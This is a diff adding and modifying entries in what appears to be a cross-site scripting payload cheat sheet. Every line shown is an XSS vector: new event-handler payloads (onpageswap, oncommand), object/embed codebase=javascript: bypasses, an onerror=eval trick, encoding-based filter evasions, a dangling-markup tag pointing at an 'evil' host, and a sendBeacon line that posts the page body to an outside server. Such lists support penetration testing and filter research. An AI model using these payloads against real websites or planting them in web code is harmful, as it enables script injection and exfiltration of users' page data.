@@ -74,7 +74,7 @@
 <object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"
 <frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"
 <input type=hidden type=image src=\"//evil?
-<video poster=//evil?
+<video poster=\"//evil?
 %C0%BCscript>alert(1)<\/script>\n%E0%80%BCscript>alert(1)<\/script>\n%F0%80%80%BCscript>alert(1)<\/script>\n%F8%80%80%80%BCscript>alert(1)<\/script>\n%FC%80%80%80%80%BCscript>alert(1)<\/script>
 <script>\\u0061lert(1)<\/script>
 <script>\\u{61}lert(1)<\/script>
@@ -1004,6 +1004,8 @@ code
 <div ongestureend=alert(1)>XSS</div>
 <body onpagereveal=alert(1)>
 <* onsecuritypolicyviolation=alert(1)>XSS</*>
+<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
@@ -1044,6 +1046,12 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
 <script>navigation.navigate('javascript:alert(1)')</script>
+<object data=# codebase=javascript:alert(document.domain)//>
+<embed src=# codebase=javascript:alert(document.domain)//>
+<object data=\"#\nalert(1)\" codebase=javascript://>
+<object data=\"#!\nalert(1)\" codebase=javascript:>
+<embed src=\"#\nalert(1)\" codebase=javascript://>
+<embed src=\"#!\nalert(1)\" codebase=javascript:>
 <script>onerror=alert;throw 1</script>
 <script>{onerror=alert}throw 1</script>
 <script>throw onerror=alert,1</script>
@@ -1094,6 +1102,7 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'>
 <img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>
 <svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>
+<script>onerror=eval,new name</script>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
